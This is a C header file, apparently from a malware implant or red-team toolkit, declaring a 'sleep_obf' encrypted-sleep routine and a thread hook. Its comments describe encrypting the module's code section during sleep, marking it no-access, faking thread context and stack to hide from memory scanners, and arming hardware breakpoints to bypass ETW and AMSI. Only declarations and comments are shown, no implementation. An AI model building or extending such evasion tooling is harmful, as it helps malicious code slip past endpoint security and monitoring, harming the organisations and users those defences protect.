#pragma once
#include <windows.h>

/*
 * Optional hook called with the timer thread handle before .text is encrypted.
 * Use to arm hardware breakpoints (ETW/AMSI bypass) on the timer thread.
 * Set to NULL if not needed.
 */
typedef void (*sleep_obf_thread_hook_t)(HANDLE hThread);
extern sleep_obf_thread_hook_t g_sleep_obf_thread_hook;

/*
 * sleep_obf() — encrypted sleep
 *
 * Encrypts the calling module's .text section with a BCryptGenRandom key,
 * marks it PAGE_NOACCESS, switches to a fake thread context pointing to
 * NtWaitForSingleObject on a fake stack, and restores state on wakeup.
 *
 * Falls back to plain Sleep() if any setup step fails (ACG, section not
 * found, allocation failure).
 */
void sleep_obf(DWORD ms);
